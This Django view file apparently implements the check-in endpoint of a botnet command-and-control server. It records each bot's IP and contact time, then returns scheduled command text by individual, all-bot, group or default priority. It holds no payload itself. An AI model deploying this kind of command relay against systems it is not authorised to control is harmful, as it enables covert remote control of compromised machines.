from django.http import HttpResponse, Http404
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from django.shortcuts import get_object_or_404
from convey.models import Bot, Command, Bot_Command

# Grab a Command object based on a hash_sum or group number
# If no command exists for the query, return None
def get_cmd(bot, query_set, hash_sum=None, group=None):
    cmd_list = None
    if hash_sum:
        cmd_list = query_set.filter(hash_assigned=hash_sum)
    elif group:
        cmd_list = query_set.filter(group_assigned=group)

    if not cmd_list:
        return None

    completed_cmds = bot.completed_cmds.all()

    for cmd in cmd_list:
        if cmd.oneshot and cmd in completed_cmds:
            continue
        else:
            return cmd

    return None

@csrf_exempt
def cmd(request):
    # Alternate clients do not currently send version
    if 'version' in request.POST:
        version = request.POST['version']
    else:
        version = None
    hash_sum = request.POST['hash_sum']
    ip_addr = request.POST['ip_addr']

    bot = get_object_or_404(Bot, hash_sum=hash_sum)
    bot.version = version
    bot.ip_addr = ip_addr
    bot.last_contact = timezone.now()
    bot.save()

    # Only use commands that are queued to run at this time
    now = timezone.now()
    active_cmds = Command.objects.filter(
        start_time__lte=now,
        end_time__gte=now
    ).order_by('start_time')

    if not active_cmds:
        raise Http404

    # Prioritize individual commands, ALL commands, group commands, and lastly
    # default commands
    # If no commands are in the bot's queue, return a 404

    command = False
    while True: # Run within loop to allow for better flow control
        command = get_cmd(bot, active_cmds, hash_sum=hash_sum)
        if command:
            break
        command = get_cmd(bot, active_cmds, group=-1)
        if command:
            break
        command = get_cmd(bot, active_cmds, group=bot.group)
        if command:
            break
        command = get_cmd(bot, active_cmds, group=-2)
        break

    # If command selected then continue
    if command:
        # Then check if bot already ran command
        # If not, then add command to bot's list of completed commands
        Bot_Command.objects.get_or_create(
            bot=bot,
            cmd=command,
        )

        # Lastly return the command text (or 404)
        return HttpResponse(command.cmd_txt)
    raise Http404
